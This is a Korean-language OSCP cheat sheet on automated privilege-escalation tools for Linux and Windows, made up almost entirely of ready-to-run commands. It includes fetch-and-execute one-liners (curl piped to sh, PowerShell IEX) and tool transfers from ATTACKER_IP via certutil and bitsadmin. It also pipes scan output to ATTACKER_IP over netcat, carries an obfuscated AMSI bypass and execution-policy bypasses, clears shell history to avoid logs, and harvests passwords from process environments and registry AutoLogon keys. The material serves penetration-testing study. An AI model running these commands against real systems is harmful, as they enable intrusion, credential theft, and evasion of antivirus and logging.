# Privilege Escalation - Automated Tools

> **OSCP 핵심**: Linux와 Windows 권한상승 자동화 도구들을 즉시 실행하여 모든 취약점 발견

## ⚡ 즉시 실행할 명령어들

### 🔥 Linux 자동화 도구 (30초 안에)

```bash
# LinPEAS (가장 강력한 Linux privesc 도구)
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
# 또는
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh

# LinEnum (빠른 기본 스캔)
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh && chmod +x LinEnum.sh && ./LinEnum.sh

# linux-exploit-suggester (커널 익스플로잇 전용)
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh && chmod +x linux-exploit-suggester.sh && ./linux-exploit-suggester.sh

# LSE (Linux Smart Enumeration)
wget https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh && chmod +x lse.sh && ./lse.sh -l1
```

### 🎯 Windows 자동화 도구 (즉시)

```cmd
:: WinPEAS (가장 강력한 Windows privesc 도구)
powershell -c "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASbat/winPEAS.bat')"

:: 또는 실행 파일 다운로드
powershell -c "Invoke-WebRequest -Uri 'https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe' -OutFile 'winPEAS.exe'"
winPEAS.exe

:: PowerUp (PowerShell 기반)
powershell -c "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1'); Invoke-AllChecks"

:: Seatbelt (C# 기반 정보 수집)
powershell -c "Invoke-WebRequest -Uri 'https://github.com/GhostPack/Seatbelt/releases/latest/download/Seatbelt.exe' -OutFile 'Seatbelt.exe'"
Seatbelt.exe -group=all
```

### ⚡ 파일 전송 (자동화 도구 업로드용)

```bash
# Linux에서 파일 다운로드
wget http://ATTACKER_IP:8000/linpeas.sh
curl -O http://ATTACKER_IP:8000/linpeas.sh
nc ATTACKER_IP 4444 < linpeas.sh  # 공격자에서 nc -l -p 4444 > linpeas.sh

# Base64 인코딩 전송 (방화벽 우회)
echo "base64_encoded_script" | base64 -d > linpeas.sh
```

```cmd
:: Windows에서 파일 다운로드
powershell -c "Invoke-WebRequest -Uri 'http://ATTACKER_IP:8000/winPEAS.exe' -OutFile 'winPEAS.exe'"
certutil -urlcache -split -f http://ATTACKER_IP:8000/winPEAS.exe winPEAS.exe
bitsadmin /transfer myDownloadJob /download /priority normal http://ATTACKER_IP:8000/winPEAS.exe C:\Windows\Temp\winPEAS.exe

REM SMB를 통한 전송
copy \\ATTACKER_IP\share\winPEAS.exe C:\Windows\Temp\
```

## 📋 단계별 체크리스트

### Phase 1: 플랫폼 및 도구 선택 (1분)

- [ ] **운영체제 확인**: Linux vs Windows 플랫폼 판별
- [ ] **아키텍처 확인**: x86 vs x64 (32bit vs 64bit)
- [ ] **권한 확인**: 현재 사용자 권한 및 제약사항
- [ ] **네트워크 접근**: 인터넷 연결 가능 여부
- [ ] **파일 업로드**: 파일 업로드 가능한 디렉토리 확인

### Phase 2: 도구 다운로드 및 업로드 (2분)

- [ ] **인터넷 접근 가능**: wget, curl, PowerShell로 직접 다운로드
- [ ] **인터넷 차단**: 공격자 머신에서 도구 업로드
- [ ] **실행 권한**: 다운로드한 도구에 실행 권한 부여
- [ ] **경로 확인**: 도구가 올바른 경로에 배치되었는지 확인
- [ ] **안티바이러스**: 바이러스 스캐너에 의한 삭제 여부 확인

### Phase 3: 자동화 도구 실행 (3-5분)

- [ ] **기본 실행**: 도구의 기본 스캔 모드 실행
- [ ] **결과 저장**: 스캔 결과를 파일로 저장
- [ ] **빠른 모드**: 시간이 부족한 경우 빠른 스캔 모드
- [ ] **상세 모드**: 시간이 충분한 경우 상세 스캔 모드
- [ ] **오류 처리**: 실행 중 오류 발생시 대안 도구 사용

### Phase 4: 결과 분석 및 수동 확인 (5분)

- [ ] **고위험 발견**: 즉시 권한상승 가능한 취약점 우선 확인
- [ ] **중위험 발견**: 추가 분석이 필요한 취약점들
- [ ] **수동 검증**: 자동화 도구 결과의 수동 확인
- [ ] **False Positive**: 거짓 양성 결과 필터링
- [ ] **추가 도구**: 필요시 다른 자동화 도구 병행 실행

## 🎯 플랫폼별 즉시 익스플로잇

### 🐧 Linux 자동화 도구 활용

```bash
# LinPEAS 상세 실행
chmod +x linpeas.sh

# 모든 정보 수집 (기본)
./linpeas.sh

# 빠른 스캔 (시간 부족시)
./linpeas.sh -q

# 특정 모듈만 실행
./linpeas.sh -o SysI,Devs,AvaSof,ProCronSrvcsTmrsSocks,Net,UsrI,SofI,IntFiles

# 결과 파일로 저장
./linpeas.sh > linpeas_output.txt 2>&1

# 컬러 없이 저장 (가독성 향상)
./linpeas.sh -a > linpeas_clean.txt 2>&1

# 패스워드 검색 포함
./linpeas.sh -p

# 네트워크 정보 제외 (빠른 실행)
./linpeas.sh -o SysI,Devs,AvaSof,UsrI,SofI,IntFiles
```

```bash
# LinEnum 다양한 옵션
chmod +x LinEnum.sh

# 기본 실행
./LinEnum.sh

# 상세 모드 (더 많은 정보)
./LinEnum.sh -t

# 키워드 검색 포함
./LinEnum.sh -k password,key,secret

# 결과 저장
./LinEnum.sh -r linenum_report
```

```bash
# linux-exploit-suggester (커널 익스플로잇 전용)
chmod +x linux-exploit-suggester.sh

# 기본 실행
./linux-exploit-suggester.sh

# 상세 모드
./linux-exploit-suggester.sh -d

# 특정 커널 버전 지정
./linux-exploit-suggester.sh -k 4.15.0

# CVE만 출력
./linux-exploit-suggester.sh --cvelist-only
```

```bash
# LSE (Linux Smart Enumeration)
chmod +x lse.sh

# 레벨 1 (빠른 스캔)
./lse.sh -l1

# 레벨 2 (상세 스캔)
./lse.sh -l2

# 특정 섹션만
./lse.sh -s
```

### 🪟 Windows 자동화 도구 활용

```cmd
:: WinPEAS 다양한 실행 옵션
:: 기본 실행
winPEAS.exe

:: 빠른 스캔
winPEAS.exe cmd fast

:: 결과 파일로 저장
winPEAS.exe > winpeas_output.txt

:: 특정 검사만 실행
winPEAS.exe systeminfo
winPEAS.exe userinfo
winPEAS.exe processinfo
winPEAS.exe servicesinfo
winPEAS.exe applicationsinfo
winPEAS.exe networkinfo
winPEAS.exe windowscreds

:: 색상 없이 출력 (파일 저장용)
winPEAS.exe cmd > winpeas_clean.txt

:: 조용한 모드 (진행률 표시 없음)
winPEAS.exe quiet
```

```powershell
# PowerUp 상세 사용법
# PowerUp 로드
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1')

# 모든 검사 실행
Invoke-AllChecks

# 개별 검사 실행
Get-ServiceUnquoted
Get-ModifiableServiceFile
Get-ModifiableService
Get-ServiceDetail
Get-UnattendedInstallFile
Get-Webconfig
Get-ApplicationHost
Get-RegistryAutoLogon
Get-RegistryAlwaysInstallElevated
Get-ModifiableRegistryAutoRun
Get-ModifiableScheduledTaskFile
Get-UnquotedService
Get-ModifiableFile

# 결과 저장
Invoke-AllChecks | Out-File -FilePath powerup_results.txt

# HTML 보고서 생성
Invoke-AllChecks | ConvertTo-Html | Out-File powerup_report.html
```

```cmd
:: Seatbelt 상세 사용법
:: 전체 검사
Seatbelt.exe -group=all

:: 그룹별 검사
Seatbelt.exe -group=system
Seatbelt.exe -group=user
Seatbelt.exe -group=misc
Seatbelt.exe -group=chrome
Seatbelt.exe -group=remote

:: 개별 검사
Seatbelt.exe TokenPrivileges
Seatbelt.exe WindowsCredentialFiles
Seatbelt.exe PowerShellHistory
Seatbelt.exe Services
Seatbelt.exe NetworkShares
Seatbelt.exe ProcessCreationEvents

:: 결과 저장
Seatbelt.exe -group=all -outputfile=seatbelt_results.txt

:: JSON 형식으로 저장
Seatbelt.exe -group=all -output=json
```

## 🤖 도구별 고급 활용법

### 🔍 LinPEAS 마스터 활용

```bash
# LinPEAS 고급 옵션 조합
chmod +x linpeas.sh

# 완전한 스캔 (모든 옵션)
./linpeas.sh -a -p -o SysI,Devs,AvaSof,ProCronSrvcsTmrsSocks,Net,UsrI,SofI,IntFiles

# 네트워크 환경에서 외부 도구 사용
./linpeas.sh -P

# 특정 바이너리 경로 지정
./linpeas.sh -d /custom/path

# 슬로우 스캔 (더 많은 정보)
./linpeas.sh -s

# 메모리 사용량 최소화
./linpeas.sh -m

# 특정 사용자로 실행
sudo -u otheruser ./linpeas.sh

# 결과 분석 스크립트
grep -E "(VULNERABLE|HIGH|CRITICAL)" linpeas_output.txt
grep -E "99%" linpeas_output.txt  # 99% 확률 취약점만
grep -E "95%" linpeas_output.txt  # 95% 확률 취약점
```

### 🎯 WinPEAS 고급 활용

```cmd
:: WinPEAS 고급 검사 조합
:: 메모리에서 직접 실행 (디스크 흔적 없음)
powershell -c "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASbat/winPEAS.bat')"

:: 특정 도메인 환경 검사
winPEAS.exe domain

:: 클라우드 환경 검사 (AWS, Azure, GCP)
winPEAS.exe cloud

:: 컨테이너 환경 검사
winPEAS.exe container

:: 특정 시간대 파일만 검사
winPEAS.exe filesinfo fileanalysis

:: LOLBAS 바이너리 검사
winPEAS.exe lolbas

:: 백도어 검사
winPEAS.exe malware

:: 결과 필터링
winPEAS.exe | findstr /i "vulnerable\|high\|critical"
winPEAS.exe | findstr /C:"99%" /C:"95%"
```

### 🛠️ 도구 조합 및 병렬 실행

```bash
# Linux 도구들 병렬 실행
echo "Starting parallel enumeration..."
./linpeas.sh > linpeas.txt 2>&1 &
./LinEnum.sh > linenum.txt 2>&1 &
./linux-exploit-suggester.sh > exploits.txt 2>&1 &
./lse.sh -l1 > lse.txt 2>&1 &

# 모든 작업 완료 대기
wait

# 결과 통합
echo "=== LinPEAS Results ===" > combined_results.txt
cat linpeas.txt >> combined_results.txt
echo -e "\n=== LinEnum Results ===" >> combined_results.txt
cat linenum.txt >> combined_results.txt
echo -e "\n=== Exploit Suggestions ===" >> combined_results.txt
cat exploits.txt >> combined_results.txt
echo -e "\n=== LSE Results ===" >> combined_results.txt
cat lse.txt >> combined_results.txt
```

```cmd
:: Windows 도구들 순차 실행 스크립트
@echo off
echo Starting comprehensive Windows enumeration...

echo [+] Running WinPEAS...
winPEAS.exe > winpeas_results.txt 2>&1

echo [+] Running Seatbelt...
Seatbelt.exe -group=all > seatbelt_results.txt 2>&1

echo [+] Running PowerUp...
powershell -c "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1'); Invoke-AllChecks" > powerup_results.txt 2>&1

echo [+] Combining results...
echo === WinPEAS Results === > combined_windows_results.txt
type winpeas_results.txt >> combined_windows_results.txt
echo. >> combined_windows_results.txt
echo === Seatbelt Results === >> combined_windows_results.txt
type seatbelt_results.txt >> combined_windows_results.txt
echo. >> combined_windows_results.txt
echo === PowerUp Results === >> combined_windows_results.txt
type powerup_results.txt >> combined_windows_results.txt

echo [+] Enumeration complete. Check combined_windows_results.txt
```

## 👀 놓치기 쉬운 것들

### 🚨 자동화 도구의 한계점들

```bash
# 1. 네트워크 연결 제한시 로컬 도구 사용
# 사전에 도구들을 준비해둔 디렉토리
ls -la /opt/privilege-escalation-tools/
# LinPEAS, LinEnum, linux-exploit-suggester 등 로컬 저장

# 2. 실행 권한 없는 환경
# 스크립트 내용을 직접 복사하여 실행
curl -s https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash

# 3. 쓰기 권한 없는 환경
# /tmp나 /dev/shm 사용
cd /dev/shm && wget https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh

# 4. 바이너리 실행 제한 환경
# 스크립트 기반 도구만 사용
bash <(curl -s https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh)

# 5. 로그 남기지 않기
# 히스토리 비활성화 후 실행
unset HISTFILE
./linpeas.sh
history -c
```

```cmd
:: Windows 환경에서 놓치기 쉬운 것들
:: 1. PowerShell 실행 정책 제한
powershell -ExecutionPolicy Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('URL')"

:: 2. AMSI (Antimalware Scan Interface) 우회
powershell -c "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true); IEX(New-Object Net.WebClient).DownloadString('URL')"

:: 3. Windows Defender 실시간 보호 우회
:: 메모리에서만 실행하거나 난독화된 도구 사용

:: 4. 제한된 사용자 권한
:: 사용자별 도구 실행 (Seatbelt user checks)
Seatbelt.exe -group=user

:: 5. 로그 최소화
:: 조용한 모드로 실행
winPEAS.exe quiet > nul 2>&1
```

### 🔍 자동화 도구가 놓치는 수동 확인 사항들

```bash
# 1. 환경 변수의 특수 설정
echo $LD_PRELOAD $LD_LIBRARY_PATH $PATH
printenv | grep -E "(LD_|PATH|PYTHON|PERL)"

# 2. 하드링크와 심볼릭 링크 악용
find / -type l -ls 2>/dev/null | head -20
find / -links +1 -type f 2>/dev/null | head -20

# 3. 숨겨진 프로세스나 포트
ss -tulpn | grep -E ":22|:80|:443|:3306|:5432"
ps auxwww | grep -v "\[.*\]" | head -20

# 4. 특수 그룹 멤버십
groups | grep -E "(docker|lxd|disk|shadow|adm)"
id | grep -oE "\([^)]+\)" | grep -E "(disk|shadow|adm)"

# 5. 최근 명령어 히스토리 분석
find /home -name ".*history" 2>/dev/null -exec tail -10 {} \;
cat ~/.bash_history | grep -E "(su|sudo|ssh|scp|mysql|pass)" | tail -10

# 6. 메모리에서 패스워드 검색
strings /proc/*/environ 2>/dev/null | grep -i pass | head -5

# 7. 프로세스별 열린 파일
lsof -nP 2>/dev/null | grep -E "(config|pass|key)" | head -10

# 8. 실행 중인 컨테이너 확인
ls -la /.dockerenv 2>/dev/null
cat /proc/1/cgroup | grep -E "(docker|lxc)" 2>/dev/null

# 9. 커널 모듈 분석
lsmod | grep -vE "(soundcore|usbcore|ehci|ohci)" | head -10

# 10. 특수 파일시스템 마운트
mount | grep -vE "(proc|sys|dev|run)" | grep -E "(nfs|cifs|fuse)"
```

```cmd
:: Windows 수동 확인 사항들
:: 1. 레지스트리 특수 키들
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies" /s | findstr "Installer\|UAC"

:: 2. 서비스 의존성 확인
sc enumdepend spooler
wmic service where "name='spooler'" get PathName,StartName,State

:: 3. 프로세스 상세 분석
wmic process get name,processid,parentprocessid,commandline | findstr /v "commandline"

:: 4. 네트워크 연결의 프로세스 매핑
netstat -anob | findstr "LISTENING\|ESTABLISHED"

:: 5. 이벤트 로그 최근 항목
wevtutil qe Security /c:5 /rd:true /f:text | findstr "Logon"
wevtutil qe System /c:5 /rd:true /f:text | findstr "Error"

:: 6. WMI 이벤트 구독 확인
wmic /namespace:\\root\subscription path __EventFilter get * /format:list

:: 7. 코드 서명 우회 확인
powershell "Get-AuthenticodeSignature C:\Windows\System32\*.exe | Where-Object {$_.Status -ne 'Valid'}" 2>nul

:: 8. 메모리 덤프 파일 확인
dir /b /s C:\Windows\*.dmp 2>nul
dir /b /s C:\*.mdmp 2>nul

:: 9. 숨겨진 공유 확인
net share | findstr "\$"
wmic share where "name like '%$'" get name,path

:: 10. 대체 데이터 스트림 확인
dir /r C:\Windows\System32\*.exe | findstr ":.*:"
```

### ⚡ False Positive 및 결과 검증

```bash
# LinPEAS 결과 검증 스크립트
validate_linpeas_results() {
    echo "=== Validating LinPEAS High-Risk Findings ==="

    # SUID 바이너리 재확인
    echo "[+] Validating SUID binaries..."
    find / -type f -perm -4000 2>/dev/null | while read suid_file; do
        if [ -x "$suid_file" ]; then
            echo "CONFIRMED: $suid_file"
        else
            echo "FALSE POSITIVE: $suid_file (not executable)"
        fi
    done

    # sudo 권한 재확인
    echo "[+] Validating sudo permissions..."
    timeout 5 sudo -l 2>/dev/null && echo "CONFIRMED: sudo access" || echo "NO sudo access"

    # 쓰기 가능한 중요 디렉토리 재확인
    echo "[+] Validating writable directories..."
    for dir in /etc /bin /sbin /usr/bin /usr/sbin; do
        if [ -w "$dir" 2>/dev/null ]; then
            echo "CRITICAL: $dir is writable"
        fi
    done
}

validate_linpeas_results
```

```cmd
:: WinPEAS 결과 검증 스크립트
@echo off
echo === Validating WinPEAS High-Risk Findings ===

echo [+] Validating AlwaysInstallElevated...
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated 2>nul | findstr AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated 2>nul | findstr AlwaysInstallElevated

echo [+] Validating AutoLogon credentials...
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" | findstr "DefaultUserName\|DefaultPassword"

echo [+] Validating unquoted service paths...
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

echo [+] Validating stored credentials...
cmdkey /list 2>nul | findstr "Target"

echo [+] Validating file permissions...
icacls "C:\Program Files" | findstr "Everyone\|Users" | findstr "F\|M"

echo === Validation Complete ===
```

### 🔧 도구 실행 최적화 및 문제 해결

```bash
# 메모리 부족 환경에서의 실행
# 1. 스왑 파일 생성
sudo dd if=/dev/zero of=/tmp/swapfile bs=1M count=512 2>/dev/null
sudo mkswap /tmp/swapfile 2>/dev/null
sudo swapon /tmp/swapfile 2>/dev/null

# 2. 도구 실행 후 정리
./linpeas.sh > results.txt 2>&1
sudo swapoff /tmp/swapfile 2>/dev/null
rm /tmp/swapfile 2>/dev/null

# 3. 제한된 디스크 공간
# 결과를 즉시 네트워크로 전송
./linpeas.sh | nc ATTACKER_IP 4444

# 4. 느린 시스템에서의 최적화
# 빠른 스캔만 실행
./linpeas.sh -q -o SysI,UsrI | head -500

# 5. 권한 부족시 대안
# 읽기 전용 정보만 수집
./linpeas.sh -o SysI,Net,UsrI
```

```cmd
:: Windows 도구 실행 최적화
:: 1. 메모리 부족시 가벼운 도구만
Seatbelt.exe TokenPrivileges WindowsCredentialFiles

:: 2. 네트워크 제한시 오프라인 모드
winPEAS.exe systeminfo userinfo servicesinfo

:: 3. 실행 정책 문제시 우회
powershell -nop -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('URL')"

:: 4. AMSI 문제시 우회
powershell -c "$a='System.Management.Automation.A';$b='msiUtils';$u=$a+$b;$k=[Ref].Assembly.GetType($u);$z=$k.GetField('amsiInitFailed','NonPublic,Static');$z.SetValue($null,$true);IEX(New-Object Net.WebClient).DownloadString('URL')"

:: 5. 로그 회피를 위한 메모리 실행
powershell -nolog -noni -nop -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('URL')"
```

## 🚨 중요 참고사항

### ⏰ 시간 관리

- **처음 1분**: 플랫폼 확인 및 적절한 도구 선택
- **다음 2분**: 도구 다운로드/업로드 및 실행 권한 설정
- **3-5분**: 자동화 도구 실행 (병렬 실행 권장)
- **마지막 5분**: 결과 분석 및 고위험 취약점 수동 검증

### 🎯 도구 선택 우선순위

**Linux:**

1. **LinPEAS**: 가장 포괄적이고 정확한 도구
2. **linux-exploit-suggester**: 커널 익스플로잇 전용
3. **LinEnum**: 빠른 기본 정보 수집
4. **LSE**: 스마트한 열거 및 분석

**Windows:**

1. **WinPEAS**: 가장 포괄적인 Windows privesc 도구
2. **PowerUp**: PowerShell 환경에서 강력함
3. **Seatbelt**: 상세한 시스템 정보 수집
4. **SharpUp**: .NET 환경에서 빠른 실행

### 🔥 즉시 시도할 것들

- 자동화 도구 실행과 동시에 수동 확인 병행
- 고위험(99%, 95%) 결과 우선 검증
- False Positive 필터링으로 시간 절약
- 여러 도구 결과 교차 검증으로 정확도 향상

### 💡 팁

- 자동화 도구는 시작점이지 끝이 아님
- 도구 결과는 반드시 수동 검증 필요
- 네트워크 제한 환경을 대비해 로컬 도구 준비
- 메모리 실행으로 흔적 최소화
- 여러 도구 조합으로 누락 방지
- 결과 저장 및 분석을 통한 체계적 접근
